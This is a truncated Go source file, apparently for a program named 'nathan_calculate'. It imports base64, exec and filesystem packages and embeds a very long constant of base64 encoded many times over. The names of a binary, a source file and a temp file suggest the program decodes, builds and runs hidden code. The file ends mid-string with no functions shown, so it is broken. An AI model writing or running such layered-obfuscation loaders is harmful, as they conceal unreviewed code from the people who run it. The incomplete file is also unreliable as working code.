package main

import (
	"bytes"
	"encoding/base64"
	"errors"
	"io/fs"
	"log"
	"os"
	"os/exec"
)

const (
	binFile    = "nathan_calculate"
	binPath    = "./" + binFile
	srcFile    = binFile + ".go"
	srcFileTmp = binFile + ".go.tmp"
	srcEnc     = "V1RCa1IyRnRSWGxTYlRWaFZUQktNRmRXWkhOa1ZVNXVZMGhDYVZkRlNqSlpNalZTV2pCMFFtSXdjRXBpVm5Bd1drVk9TbE13VGxSVGJsSmFWMFpLZGxSRVRrdGhSMHAwVlZkc1JGb3lkSEJhUldSelpFWndWRk5WZEV4VlZ6bE1WMjAxVjJSV2JEVlJibEphVmpKNE1WTXdUbkphTWxZellqQndUV1ZVYUc1V1J6RnpZV3h3VkZGcVFtcGliWFI2VTFWYVEySkhVa2hXYm14TldqSTVTMWRyYUZkbFZXeEZZbnBzU2xKR1ZuaGFSV1J6WkVad1ZFNVdVbUZXTURVeVdXMHhVbG93ZERWUmFrSm9WbnBHYzFSSGRGTk5WMDUwVW1wQ2FGWjZiREZUTUdoTFlVZEtkRlZZVmxSV2VsVjNWRmh3UjJSVmRFVlNXR1JPVWtWR2QxTXhUbmROUjBaWVRWZDRUV0Y2Um5kWmEyUTBZMGROZVZadGNHbE5hbFp5VVRKa2MwMUhSbGhOVjNoTllrVTFlbGRzWkZka01IUklWV3BHYW1GWGRFeFJNV1JoWkVkU1JFNVdSbXBpVjNneFdrVmtOR1JWZEVoUFZFWnJVMFZKZUZwRlRuSlRNbHBTWWpCMFdrMXFiREZaZWs1U1dqSkplbFpxUW1wVFJsbDNVMVZSZDFveGJFSmpSVXBhWWxkb2IxVkdUWGRsYXpGVVRraGtUV1ZyVlRCVVIzQkNaR3MxY1ZkWVZrNVJXRUpEVjFjeGMyRXlSblJTYmxaUlZYcENOVlJXVFRCa01IZzJVMVJLVFdGclJqSlVibkJhWkZVeFFtTkZTbHBqTURsM1YxUktjVkpJUmxWTlNGSk9ZV3RzTVZSVlRUUmxWVGxVVGtSQ1RXVnRZM2hVUjNCQ1V6RkdXRlJ0Y0dwaVZWVTFWRVpTU21WcmVIRlJXRnBPWVd4c01WUnJUVFJOTURWd1RraGtSR0V3V25KWGEyUnpaV3RzUmxKdGJGcFdNSEJ2VlVaTmQyVnJOVFZPU0dSTlpXdFZlVlJIY0VKa2F6VnhWbGhXVGxGWVFrTlhhMlJYWXpGc1dHSkhkR0ZXUkVJd1ZGaHdTbVJWTVVSUFNHaFBaVlJTTmxSSWNGcE5SWGh4VVZWMFVsWXhTbk5aYlc5M1pFVXhjVlJZVms1UmVtZzFWREZOTUdWRmVEWlpla1pOWVd0R1RGVldaRzlOYkd4WllucHNUVlpGYXpCVVIzQkNaR3N4Y1ZaWVZrOVJlbWQ2Vkc1ck1HUXdUbkpTYms1YVlteGFORnBHWkZkbFYwNVpWbTE0VVZWNlFqWlViRTB3WkRCNE5sSlVRazFoYTBZeVZHMXdWbVJWTVVKalJVcHBVakZaTUZkV1l6RmhNazUwVWxSc1RWWkZNSGhVUjNCQ1pHc3hWVkpZVms1UmVtZDVWRlZOTUdRd1RuSlNiazVoVjBkb2IxbHRNVk5sVjBaWVVsUnNUVlpGYXpCVVIzQkNaR3N4Y1ZGWVZrNVJlbWQ1VkRGTk1HUXdUbkpTYms1aFRXMTRjMWt5TlU1UFZYaFZWRmh3VFdGclJqSlVWbEp1WkZVeGNFOUVUazVWZWxJelVUSjBSMk15UmxoVWJYaEtVbXMxTTFreU1YTmtWbTk2VkZSc1RWWkZNVFZVUjNCQ1pHc3hjVkpZVms1UmVtZDZWRlpOTUdRd1RuSlNiazVwVmpCWmQxcFdVWGRrUlRWRlZGaFdUbEY2YURSVVZVMHdaREI0TmxkWVpFMWhhMFpNVlZaamVHVnRVa2hXYm14aFVqQmFNRlZHVFhkTlJURTFUa2hrVFdWclZqTlVSM0JLWkdzMWNWTllWazVSV0VKRFdXMHhSMkV5VmxsVFZHeE5Wa1pWTUZSSGNFSmthM2hWVjFoV1VGVjZaM2RVYTAwd1pEQk9jbEp1VmxwTmJXZ3lXVEl4UjJKc2NGVk5TRkpQVWtkT01WUlZUVFJsVlhoeFdqTmFUMVpGVmpGVVZVWjNVVzFLZEZWdVdtcGlhM0J2VTFWa05HRkZiRWRYYlhocFVqTm9iMVZHVFhkTlJUVlVUa2hrVFdWdGRERlVNRTAwVFdzeFZFNUlaRVJoTUZveFdWUktSMlZXYkZWTlNGSlBVa1ZXTVZSVlRUUmxSVEZ3VGtoa1RXVnNiRFJVUjNCQ1V6RkdXRTVVUWxwV2VsWnZXVzB4UjJWWFJsbFhibHBSVlhwQ05sUldUVEJrTUhnMlVsUk9UV0Z0ZERKVWJYQnlaRlV4UW1ORlNtbGliRW8yV1Zab1MyRkhTblJTYmxaYVZrUkNNRlJYY0c1a1ZURkVUMGhzVDFWNlVqVlVTSEJxWld0NGNWRlZkRkpYUlhCNVdWVmtSMlJXYjNsV2JrNXFUVzVOTlZSR1VsSk9SWGh4VVZoYVRsVjZValpVU0hCV1RUQjRjVkZWZEZKWFJUVjJWMnBLUjJGV2JGbFZWR3hOVmtVd01WUkhjRUprYXpGVldUTldUbFY2WjNsVWJtc3daREJPY2xKdWNHbFdNRm8xVjFaUmQyUkZNVFphTTFaT1VYcG9ORlJzVFRCTmEzZzJWMVJPVFdGclJreFZWbWhQWld4c1dGTlViRTFXUlZWNlZFZHdRbVJyTVRaUldGWlBWWHBuTUZSV1RUQmtNRTV5VW01d2ExSXdXakZYVmxGM1pFVTFWVkpZVms1UmVtZzJWRWR3Vm1Sck5WVlVXRlpPVVZoQ1ExcEZaRzlpUjBwMVZGUnNUVlpGYXpCVVIzQkNaR3N4VldFelZrNWhWR2Q1Vkc1ck1HUXdUbkpTYWtKcFVqQmFNVnBGWkVaUFZYaFZWRmh3VFdGclJqSlVWbEpxWkZVeFJFOUVTazlsVkZJelVUSjBSMDFXYTNsa1NFNWFWbnBXY2xWR1RYZGxhemxFVGtoa1RXVnJWWGhVUjNCS1pHczFjVlZZVms1UldFSkRXa1pvVDAxSFJsaE9SR3hOVmtWck1GUkhjRUprYXpGeFVWaFdUMlZVWjNsVU1VMHdaREJPY2xOdGFHRk5iV2h5VjFaa1VrOVZlRlZUVkU1TllXdEdNbFJYY0Vwa1ZUbEVUMFJPVDFWNlVqTlJNblJMWVVadmVsWnVRbWxsYWtJd1ZGaHdTbVJWTVVSUFNHaFFWWHBSZUZSSWNGcE9WWGh4VVZWMFVtSlZXbmxhUmxGM1pFVXhObGRZVms1UmVtZzBWR3hOTUdWRmVEWlhWRXBOWVd0R1RGVlhNVWRqTWxKSVlraFNhVTB3Y0hOVlJrMTNaV3MxTlU1SVpFMWxhMVkyVkVkd1JtUnJOWEZVV0ZaT1VWaENSRmRXWTNoaFIwVjVUMFJzVFZaRlZURlVSM0JDWkdzeGNWa3pWbEJSZW1jd1ZGZHJNR1F3VG5KVGJXaHBZbGRTZVZscVNucFBWWGhWVWxSV1RXRnJSakpVVjNCdVpGVTFjRTlFVGxCUmVsSXpVVEowUzJGSFNuUmFSRVpvVmtSQ01GUlhjRTVrVlRGRVQwaHNUMkZVVWpOVVNIQnVaREI0Y1ZGVmRGSmlWVm94V1ZjMVYyTXhRbFJOU0d4T1ZYcFNNMVJJY0VwTmEzaHhVVmhhVDJWdFpERlVWVVozVVRGc1dWTnRjR0ZXTTJneVdXMHhSazlWZUZWVVZGWk5ZV3RHTWxSV1VtNWtWVEZ3VDBSS1QyRlVVak5STW5STFlVZFNTRkpVYkUxV1JXc3hWRWR3UW1Sck1YRldXRlpPVlhwbmVsUnRhekJrTUU1eVUyMW9hMU5HV2pCWlZsRjNaRVV4TmxaWVZrNVJlbWcwVkd0Tk1HUXdlRFpYV0d4TllXdEdURlZYTVZkalIwWjBZa2hXWVdWcVFqQlVhMUphWkZVeFJFOUlhRTVoVkZFeFZFaHdXazB3ZUhGUlZYUlNZbFphZDFreU5WZE5Sa0pVVFVoc1VGVjZVak5VU0hCS1pEQjRjV0V6V2s5bGF6RXhWRlZHZDFFeGNGaGxSelZxWWxWYWNsZHNVWGRrUlRWRlVWaFdUbEY2YURSVVYyc3dUVlY0TmxkVVVrMWhhMFpNVlZjeFYyTXlSbGxqUjNoS1VsVTFkMXBGYUhKUFZYaFZVMVJLVFdGclJqSlVWM0JhWkZVMU5VOUVUazloVkZJelVUSjBTMkpIU25SYVJ6bGFWMGhDZDFWR1RYZGxhekZ3VGtoa1RXVnJWVEZVUjNCeVpHczFjVm96Vms1UldFSkVWMnhvUzJKc2NGaE9SR3hOVmtaR05WUkhjRUprYXpVMVRrUk9UV1ZzVlhsVVIzQkNVekZHZEZadWJHbFNNbmd4VlVaTmQwMUZNVlJPU0dSTlpXdFdNMVJIY0U1a2F6VnhWVmhXVGxGWVFrUlpWbVEwWVZac1dFOUViRTFXUmtZMFZFZHdRbVJyTVZWVldGWlBaVlJuZVZSWGF6QmtNRTV5VTI1Q2FtSlZXakpWUmsxM1pWVTFWRTVJWkUxbGEydDVWRWR3Vm1Sck5UWmhNMVpPVVZoQ1JGbFdhRTlpTWtWNVZtNUtVVlY2UWpaVWJtc3daREI0TmxKWWFFMWhhekV5Vkcxd2FtUlZNVUpqUlU1b1YwVTFObGRXYUZaUFZYaFZWRmhvVFdGclJqSlVWM0JxWkZVeFJFOUVUazloVkZJelVUSjBTMk14YkZoT1ZFSnNWMFZ3YzFWR1RYZGxWVGxFVGtoa1RXVnJiRFZVUjNCS1pHczFObFpZVms1UldFSkVXV3RqTldKSFNsaFhibHBwWW14S2MxbFdZekJQVlhoVlZGUlNUV0ZyUmpKVVZsSldaRlUxY0U5RVNrNWxWRkl6VVRKMFMyUnRSbGxVYlhoUlZYcENObFJ1YXpCa01IZzJVbGhvVFdGc1JqSlViWEJHWkZVeFFtTkZUbWxOTUhCeVYyeGtSMDFYVmtWTlNGSk9aVzFPTVZSVlRUUmxSVFZFVGtoc1RXVnNhM2xVUjNCQ1V6RkdkRTlZY0ZwWFJUVXlWVVpOZDJWVk1YQk9TR1JOWldzeE0xUkhjRUprYXpsRlVsaFdUbEZZUWtSWmFrNVBUVWRKZVU1RWJFMVdSa1kyVkVkd1FtUnJNVlZSV0ZaUVZYcG5lVlJXVFRCa01FNXlVMjVhYTFZd1dubGtlbHB5VDFWNFZWTlVRazFoYTBZeVZGZHdXbVJWTVVSUFJFNVBVWHBTTTFFeWRFdGxWbXhaVlc1Q2FrMXVhRzlhUnpGR1QxVjRWVlZZY0UxaGEwWXlWRlpTUW1SVk5WUlBSRVpRVlhwU00xRXlkRXRsVm14WlkwUmFXbGRHY0hkWmEyUTBZa1pDVkUxSWJFOWhWRkl6VkVod1NrMVZlSEZSV0ZwUFpXdHNNVlJWUm5kUk1rNTBZa2QwWVUxc1dYZFphazVyWkZaQ1ZFMUliRTlWZWxJelZFaHdTazB3ZUhGUldGcFBaVzEwTVZSVlJuZFJNazUwWWtod1dtSlZXakZYYkZGM1pFVXhObEZZVms1UmVtZzFWRlpOTUUxRmVEWlpNMnhOWVd0R1RGVlhOVXROVjAxNlZHMTRhVk5GTURWVVJsSk9UbFY0Y1ZGWVdrNVdSVVl4Vkd4Tk5FMXJNVVJPU0dSRVlUQnZlRmRVU205aFIwNTBWbTV3YTFKRVFqQlVXSEJ5WkZVeFJFOUlhRTVSZWxFd1ZFaHdWazVWZUhGUlZYUlNZbXhhY2xkV2FFTmlSMDE2VlZSc1RWWkdSalZVUjNCQ1pHc3hWVkpZVms1bFZHZDVWRlpOTUdRd1RuSlRha1pvWW14YU1GZFhOVmRsVm14VlRVaFNUbUZzYkRGVVZVMDBaVlV4TlU1RVVrMWxiVTQyVkVkd1FsTXhSblZXYms1YVYwZFNiMXBXWXpSUFZYaFZWRlJPVFdGclJqSlVWbEp1WkZVNVZFOUVUazVSZWxJelVUSjBTMDFYVG5ST1dFSmhWa1JDTUZSWWNHcGtWVEZFVDBob1RtVlVValJVU0hCYVpEQjRjVkZWZEZKaWJGbzJWMVpqTUU5VmVGVlZXSEJOWVd0R01sUldVbFprVlRGRVQwUktUMUY2VWpOUk1uUlBZVVpzZEU5SFpGWk5hMW94VTFWV05FMVdhM2xTYm5CUlZYcENOVlJZYXpCa01IZzJVMWh3VFdGdGRESlVibkJPWkZVeFFtTkZVbHBXTW5nMVdXMDFUazlWZUZWVFZGSk5ZV3RHTWxSWGNGWmtWVEZFVDBSU1RsVjZVak5STW5SUFlVZEdXVk51V2xGVmVrSTFWRzVyTUdRd2VEWlRXR2hOWVd4R01sUnVjRTVrVlRGQ1kwVlNXbFl6YUhWWFZtaExUbFpDVkUxRVFrOWhWRkl6VkVod1VtUlZOVVJQUkVaUFVYcFNNMUV5ZEU5aFIwcDBVMjE0YW1KcmNHOVZSazEzVFVVMWNFNUlaRTFsYTFZMlZFZHdSbVJyTlhGUldGWk9VVmhDUlZkV2FFTmlSV3hIVlc1YWEwMXFVVFZVUmxKT1RWVjRjVkZZV2s1V1Jtd3hWRmRyTkUxck5YQk9TR1JFWVRBMWRsZFdZekZpYlUxNVlVZG9VVlY2UWpWVU1VMHdaREI0TmxKVVRrMWhiRVl5Vkcxd2FtUlZNVUpqUlZKb1VqQmFOVmxyWXpWTlIxSklWbFJzVFZaRk1IcFVSM0JDWkdzeFZWZFlWazVWZW1kNVZGaHJNR1F3VG5KVWJUbG9WakJhTVZkdWJFTlViR3hZWVhwc1RWWkZhM3BVUjNCQ1pHc3hjVlpZVmxCUmVtZDZWR3ROTUdRd1RuSlViVGxvVmpBMWIxZHFTVFJQVlhoVlZWUkNUV0ZyUmpKVU1VMHdUa1Y0TmxaVVRrMWhhMFpNVlZSS2IyTkhSa2xXYldob1UwWmFiMVZHVFhkbGF6RTFUa2hrVFdWclZUQlVSM0JhWkdzMU5sTllWazVSV0VKRldWVmtjMDFIVWtoU2JUVnBUV3BXZFZWR1RYZGxWVFZFVGtoa1RXVnJhM2hVUjNCeVpHczFObGRZVms1UldFSkZXVlZrZFZOWE1WaGlTRlkwVTFVMGVGVkdUWGRsYXpsRVRraGtUV1ZyVmpOVVIzQktaR3MxY1ZOWVZrNVJXRUpGV1ZWak5XUldiM3BTYmtKcFlsZE5OVlJHVWs1bFZYaHhVVmhhVGxaSFpERlViV3MwVFdzNVJFNUlaRVJoTURWMldUSXhjMlZ0VWtoVWJUbHJWMFZ3Y1ZsVlVYZGtSVEUyVjFoV1RsRjZhRFJVVjJzd1pWVjRObGRVVGsxaGEwWk1WVlJLYzAxSFZsUlJibHBoWVZWS1ZWZFdZekJhTVZKWVVtNXNhRlo2VmpKVlJrMTNaV3M1VkU1SVpFMWxhMVkwVkVkd2JtUnJOWEZTV0ZaT1VWaENSVmxxU2pSa2JVcFlVMjVhVVZWNlFqVlVWMnN3WkRCNE5sTlVUazFoYkVZeVZHNXdWbVJWTVVKalJWSnBUVzVuZUZsc1pFdE5WMDQyVFVoU1RtVnRUakZVVlUwMFpVVXhWRTVFVGsxbGJHd3pWRWR3UWxNeFJYbFBXRlphVmpOU05WcFdVWGRrUlRGeFZsaFdUbEY2YURWVWJXc3dUVVY0TmxsNlFrMWhhMFpNVlZSSk5XUXhjRmhPVnpsYVZqSlNjMWx0YjNka1JUVkZWbGhXVGxGNlp6RlVSM0JHWkdzMVZWb3pWazVSV0VKRldXcE9VMlJ0U25SUFZFWlJWWHBDTlZSWWF6QmtNSGcyVTFST1RXRnJiREpVYm5CdVpGVXhRbU5GVW1waVZWcHhXV3BPYWs5VmVGVlZXR1JOWVd0R01sUXhUVEJsYTNnMlYxaGtUV0ZyUmt4VmEyUkdXakZTU0ZKcVFsRlZla0kyVkZock1HUXdlRFpTVkU1TllXMTBNbFJ0Y0dwa1ZURkNZMFZXV2xVd1NsQlhWbU14WW14Q1ZFMUliRTlSZWxJelZFaHdTazFWZUhGYU0xcFFVa1ZHTVZSVlJuZFNWbXhZWkVkb2FtRnFRakJVVjNCV1pGVXhSRTlJYkU5UmVsSXpWRWh3YWsxRmVIRlJWWFJUVWpCYWVsbHJaRWRsYkVKVVRVaHdUbVZVVWpOVVNIQkdUbFY0Y1ZGWVdrOWhiV1F4VkZWR2QxSldiRmhOVjJocVRXczBlRmt6YjNka1JURTJXVE5XVGxGNmFEUlVibXN3WkRCNE5sZFVUazFoYTBaTVZXdGtSMlJIVGtoaVIzaHFZV3BDTUZSWGNGWmtWVEZFVDBoc1QyRlVVWGRVU0hCcVRUQjRjVkZWZEZOU01GbzFVMVZrVjJWcmJFZFViV2hwVWpCYWIxbHNVWGRrUlRGeFUxaFdUbEY2YURWVWJFMHdUa1Y0TmxsNlJrMWhhMFpNVld0a1IyVlhVWGxpU0ZaUlZYcENOVlJZYXpCa01IZzJVMVJPVFdGc2JESlVNRkpHWkZVeFFtTkZWbUZXZWxZelYxWm9UMkZIVG5GTlNGSk9ZVzFrTVZSVlRUUmxWVEUxVGtST1RXVnRZM2hVUjNCQ1V6RktTRlp1Vm10aVZsbzFWVVpOZDJWck5UVk9TR1JOWld0V00xUkhjRkprYXpWVllUTldUbEZZUWtaWGJHaFRaVmRKZVdKRVFsRlZla0YzVkZWTk1HUXdlRFpTV0dSTllXdEdNbFJzVW5Ka1ZURkNZMFZXYUZJd1dubFhWbEYzWkVVeGNXRXpWazVSZW1nMVZHeE5NRTVWZURaWmVrWk5ZV3RHVEZWclpITmpiVTE1VDFoV1VWVjZRWGxVYm1zd1pEQjROVTFJYUU1VmVsSTBWRWh3VW1Rd2VIRlJWWFJUVWpKNGVsbFdVWGRrUlRGeFZGaFdUbEY2YURWVWJXc3dUV3Q0TmxwNlFrMWhhMFpNVld0a2QyTkdiSFJQVkVaclVqSnpOVlJHVWtwa01IaHhVVmhhVG1GdGRERlVNVTAwVGtVeGNFNUlaRVJoTVVveVYydGpOV1JHYkZWTlNGSk9ZVzFPTVZSVlRUUmxWVEZ3VGtST1RXVnRUWGRVUjNCQ1V6RktTRTlZVG1oWFJUVjNWMnhSZDJSRk1YRlhXRlpPVVhwb05WUnJUVEJrTUhnMldUTnNUV0ZyUmt4VmEyTTFUVlpzV0dWSGFGRlZla0kxVkd4Tk1HUXdlRFpUVkVwTllXMU9NbFF3VWs1a1ZURkNZMFZXYTFZd2NHOVpWbEYzWkVVeGNWTllWazVSZW1nMVZHMXJNRTVWZURaWmVsWk5ZV3RHVEZWcmFGZGhWMHBJWWtoV1VWVjZRWGRVVjJzd1pEQjRObUV6VmxCUmVtZDVWRmhyTUdRd1RuSlZha1pwWWxaYWNsbFdZekJQVlhoVlZWaG9UV0ZyUmpKVVZsSkdaRlV4VkU5RVNrNVJlbEl6VVRKMFUwMVhUblJUYldocFlXcENNRlJYY0c1a1ZURkVUMGhzVGxGNlVYbFVTSEJxWkRCNGNWRlZkRk5UUmxvMldWVmtSMlJXYkhSV1ZHeE5Wa1V3TVZSSGNFSmthekZWVlZoV1QyVlVaM2xVYldzd1pEQk9jbFp0ZEdoV2VsWndXa1pvUzJKdFJrVk5TRkpQVWtWV01WUlZUVFJPVlhoeFZGaGFUMkZyTVRGVVZVWjNVbXh3U0UxWVdtbGliRW95V1cxdmQyUkZOVVZWV0ZaT1VYcG5kMVJIY0Vwa2F6VlZWRmhXVGxGWVFrZFphMDVEVlZac1dWUnVXbEZWZWtJMlZGZHJNR1F3ZURaU1ZGSk5ZV3RXTWxSdGNISmtWVEZDWTBWYWFXSnNTbk5YVnpGTFlrWkNWRTFJYkU5aFZGSXpWRWh3U21WRmVIRlJXRnBQWld0R01WUlZSbmRTYlU1MFUyNUNhVkpFUWpCVVdIQktaRlV4UkU5SWFGQlZlbEY0VkVod2FrMVZlSEZSVlhSVFYwVnZNbHBHYUV0TlYwcFZUVWhTVDFKR1JqRlVWVTAwVFZWNGNWSllXazlXUmtZeFZGVkdkMUl4YkZoaVNHeGFZbFZhTVZsVVRrNVBWWGhWVmxoc1RXRnJSakpVUmxKS1pGVXhOVTlFUWxCUmVsSXpVVEowWVdOR2JGaE9WMmhxWWxWYU1WcEZhRTlrYkd4VlRVaFNUbVZzUmpGVVZVMDBaVVUxTlU1RVZrMWxiR3Q1VkVkd1FsTXhTblJsU0ZwcVlsWmFObFJGVGtKYU1WWklWbXBDTTA1dGVERlZSazEzWlZVMU5VNUlaRTFsYTJ0NVZFZHdVbVJyTlRaVldGWk9VVmhDU0ZreU1VZGtWMFY1VjJwR2FtSnNSVFZVUmxKT1RrVjRjVkZZV2s1V1JVWXhWRzFyTkUxVk9VUk9TR1JFWVRGd05WZHNhRTlrVjBvMlRVaFNUbVZyYkRGVVZVMDBaVVUxTlU1RVZrMWxiR3N3VkVkd1FsTXhTblZXYmtwclZucHNlVmRXVVhka1JURTJVVmhXVGxGNmFEUlVibXN3WkRCNE5sZFVRazFoYTBaTVZXcEtSMkZYU1hwVGJscHBZbFpWTlZSR1VrNWxSWGh4VVZoYVRtRnJWakZVVlUwMFRUQXhSRTVJWkVSaE1sSnZWMWhPVUdJeVRqWk5TRkpPWVcxa01WUlZUVFJsUlRsVVRrUkdUV1ZzYXpGVVIzQkNVekZKZVZKdE5XbGlWR3h2VlVaTmQyVlZOWEJPU0dSTlpXdHJlVlJIY0VKa2F6VTJWMWhXVGxGWVFrbFhWbU14WW0xU1NFOVlTbEZWZWtJMlZGZHJNR1F3ZURaU1ZFWk5ZV3RzTWxSdGNISmtWVEZDWTBWb1dsZEZjSGRaZWs1UFlVWkNWRTFJYkU1aFZGSXpWRWh3U2s1VmVIRlVXRnBQWlcxT01WUlZSbmRUUm14WlUyNWFhMVl3VlRWVVJsSktaVlY0Y1ZGWVdrNWhiV1F4VkZock5FMHdOVlJPU0dSRVlUSlNjMWxxVGt0aWJIQlVVV3hXYVUweVVqRlZSazEzWlZVMU5VNUlaRTFsYTJ0NlZFZHdjbVJyTlRaWk0xWk9VVmhDU1ZsVlpFZGtWMVowWVhwc1RWWkZhekJVUjNCQ1pHc3hjVkpZVms5UmVtZDVWREJOTUdRd1RuSmFTRVpwVFd0V2JsVXdaRWROYkhCWVRrUnNUVlpHYTNoVVIzQkNaR3Q0VlZKVVFrMWhiRVl5VkZod1dtUlZNVUpqUldoclZqQmFjbGRXWkRSaFIwWjBVbTVzV2xaRVFqQlVWM0JxWkZVeFJFOUliRTVSZWxFeFZFaHdXazVWZUhGUlZYUlRUVEZhYjFsdE1XdE9iVVpJVDFSR1VWVjZRalZVYm1zd1pEQjRObE5ZYkUxaGJFWXlWRzV3Um1SVk1VSmpSV2hyVmpCWmQxZHNZM2hoUjBwSVVsZGtVazF0ZDNkYVZsRjNaRVV4TmxWWVZrNVJlbWcxVkZWTk1FMUZlRFpYVkU1TllXdEdURlV3WkVkak1rWllWMjFvYkZKRVFqQlVhMUpXWkZVeFJFOUVUazFoYkZZeVZHMXdVbVJWTVVKalJXeGFWbnBHY0ZwR2FFdGliRUpVVFVSQ1RsVjZVak5VU0hCeVpGVTFOVTlFU2s1aFZGSXpVVEowYjJGSFNsaGlTRTVyVW5wc01WVkdUWGRsYXpVMVRraGtUV1ZyVmpaVVIzQnVaR3MxY1ZWWVZrNVJXRUpLVjFaak1XSnNiRlJSYkU1cFRXdFZOVlJHVWs1Tk1IaHhVVmhhVG1GclJqRlViRTAwVFRBeE5VNUlaRVJoTW1odldXMHdOV05HUWxSTlNHeFBVWHBTTTFSSWNFcGxhM2h4VjFoYVQyVnNiREZVVlVaM1UxWnNXVk50YUdwaVZsVTFWRVpTVG1WcmVIRlJXRnBPVmtka01WUnJUVFJOYXpVMVRraGtSR0V5YUc5Wk1qRkxZMGRLY1UxSVVrOVNSVEV4VkZWTk5FMVZlSEZSV0ZwUFZrVnNNVlJWUm5kVFZteFpVMjAxWVZZeWVEWlhWbEYzWkVVeGNWZFlWazVSZW1nMVZGWk5NRTB3ZURaWk0yUk5ZV3RHVEZVd1pFZE5SV3hIWWtkb2FGWkVRakJVVjNCR1pGVXhSRTlJYkU5bFZGSXpWRWh3YWs1VmVIRlJWWFJVVWpCWmVWZFdZekZoUmtKVVRVaHNVRlY2VWpOVVNIQktUVlY0Y1ZOWVdrOWxiRVl4VkZWR2QxTldjRmhsU0hCb1ZucFdlVmxXVVhka1JUVkZZVE5XVGxGNlozaFVSM0J5WkdzMVZWZFlWazVSV0VKS1YyeG9TMkZIUlhsbFNFSnBUV3BSTlZSR1VrNU5SWGh4VVZoYVRsWkhaREZVTVUwMFRUQXhSRTVJWkVSaE1taDNXVEl3TldWdFJraGlTRkphVmtSQ01GUlljR3BrVlRGRVQwaG9UMkZVVWpaVVNIQmFaV3Q0Y1ZGVmRGUlNlbWh1VlZSS2IyTkZiRVpOV0VKcFlsZGtibFZVU25OTlIxWlZUVWhTVG1Gc1JqRlVWVTAwWlZVMU5VNUVRazFsYlUxNlZFZHdRbE14VGtoUFYyeGFWMFZ2ZDFWR1RYZGxhelUxVGtoa1RXVnJWalZVUjNCcVpHczFjVk5ZVms1UldFSktXV3BKTVdKcmJFWmtTRnBwWWxkTk5WUkdVa3BPUlhoeFVWaGFUbUZyTVRGVVdHczBUVEExUkU1SVpFUmhNbWd5V1cweGMyRkhUblJTVkd4TlZrVnNObFJIY0VKa2F6RnhWMWhXVDFWNlozcFVWMnN3WkRCT2NtRklXbWxpVkd4NldrWmtORTFXUWxSTlNHeFBaVlJTTTFSSWNFcE5WWGh4VlZoYVQyVnRUakZVVlVaM1UxZEplbFp1Y0d0U2Vtd3hWVVpOZDJWck5VUk9TR1JOWld0c00xUkhjRzVrYXpWeFlUTldUbEZZUWt0WGJUVkxZVWRLZEZaVWJFMVdSVEI2VkVkd1FtUnJNVlZTV0ZaUFVYcG5lVlJXVFRCa01FNXlZa2hXWVZJeWVHOVpiVEZIWkRKSmVXVklRbXBsYWtJd1ZGaHdXbVJWTVVSUFNHaE9WWHBSTUZSSWNGcE5hM2h4VVZWMFZGZEZXbTlaYTJoWFkwZFNSVTFJVWs5V1IyUXhWRlZOTkdSRk9WUk9TSEJOWld4R05sUkhjRUpUTVU1WlUyNUthMWRHU2paWldHOTNaRVUxVlZOWVZrNVJlbWcwVkVkd1FtUnJOVVZhTTFaT1VWaENTMWw2VGxOaFIwcDBVMnBHYVZKRVFqQlVXSEJ5WkZVeFJFOUlhRTVsVkZFeFZFaHdXbVZyZUhGUlZYUlVZbFZhY1ZsVVRrOWtiVXAxVjI1Q2FWSXphSE5WUmsxM1pXc3hSRTVJWkUxbGEyd3pWRWR3VG1Sck5UWlVXRlpPVVZoQ1RGZFdaREJoUjA1MVZXMW9VVlY2UWpWVVZrMHdaREI0TmxOVVNrMWhiVTR5Vkc1d1dtUlZNVUpqUlhSYVYwZDRiMWt3YUZkbFZteFZUVWhTVG1Gc1JqRlVWVTAwWlZVMU5VNUlaRTFsYlUweFZFZHdRbE14VG5SV2JteHJWMFUxYjFsclpGZGtSa0pVVFVoc1VGVjZVak5VU0hCR1RrVjRjVlJZV2s5aGJYUXhWRlZHZDFNeVNYbGhSMmhwWWxSV2MxbDZTa3ROVjA1MFdYcHNUVlpGTVRaVVIzQkNaR3N4VlZaWVZrOVZlbWQ1Vkd4Tk1HUXdUbkpqU0ZwcVpXcENNRlJYY0Zwa1ZURkVUMGhzVG1GVVVUQlVTSEJxWld0NGNWRlZkRlJpYkZwd1YxWlJkMlJGTVhGUldGWk9VWHBvTlZSdWF6Qk9SWGcyV1hwT1RXRnJSa3hWZWtwSFlWZFNXR1I2YkUxV1JrWXpWRWR3UW1Sck1WVlRXRlpPVlhwbmVWUnJUVEJrTUU1eVpFZG9hVmRGU205WmEyUkdUMVY0VlZSWWFFMWhhMFl5VkZkd1FtUlZNVVJQUkU1T1VYcFNNMUV5ZERCaFIwcDBWVzVDVVZWNlFqVlVhMDB3WkRCNE5sTlVUazFoYlU0eVZHNXdVbVJWTVVKalJYaGFWbnBXZVZkV1l6QlBWWGhWVTFob1RXRnJSakpVVjNCYVpGVTFWRTlFVGs5bFZGSXpVVEowTUdGSFNuUlBSR3hOVmtWc05WUkhjRUprYXpGeFYxaFdUMUY2WjNwVWJtc3daREJPY21SSGFHbGlhelZ2V1ROc1ExSkhSbGxWYWxaUlZYcENObFJ0YXpCa01IZzJVbGhzVFdGc1ZqSlViRkp5WkZVeFFtTkZlRnBYUlhCdlYxUktiMk5HUWxSTlNHeFBVWHBTTTFSSWNFcE5hM2h4VVZoYVQyVnNWakZVVlVaM1ZFWnNXVk51V21saVYxSnZWVVpOZDJWVk5UVk9TR1JOWld0cmQxUkhjRkprYXpVMlZWaFdUbEZZUWsxWFZtaFRZakpLV0ZKdVZtRlRSbFUxVkVaU1RtVkZlSEZSV0ZwT1ZrZGtNVlJZYXpSTmF6VTFUa2hrUkdFelVuWlhWbWhMVFVkSmVsWnVVbEZWZWtJMVZGWk5NR1F3ZURaVFZGWk5ZVzEwTWxSdWNISmtWVEZDWTBWNGFGWjZWblZaZWs1VFpHMUtjVTFJVWs1aGJVNHhWRlZOTkdWVk5UVk9SRUpOWlcxTmVWUkhjRUpUTVUxNVlraFdhazF0YUc5WmVrcEdUMVY0VlZOVVNrMWhhMFl5VkZkd1ZtUlZNVFZQUkU1UVVYcFNNMUV5ZERCa2JVcElaRWRvYTFJd1ZUVlVSbEpLWld0NGNWRllXazVoYkd3eFZHNXJORTVGTVVST1NHUkVZVE5SZUZkV1pEUmhSV3hHWlVSR2FWZEZTWGhaTW05M1pFVXhObEpZVms1UmVtZzFWRzVyTUdWcmVEWlplbEpOWVd0R1RGVjZUbGRrUm14WlZHNUNVVlY2UWpWVWJFMHdaREI0TmxOVVNrMWhhMFl5Vkc1d1dtUlZNVUpqUlhoclZucFdNRmxXWXpGaWJFSlVUVWh3VDFWNlVqTlVTSEJHVFZWNGNWa3pXazloYkd3eFZGVkdkMVJIVWxoUFdHUm9WbnBuTlZSR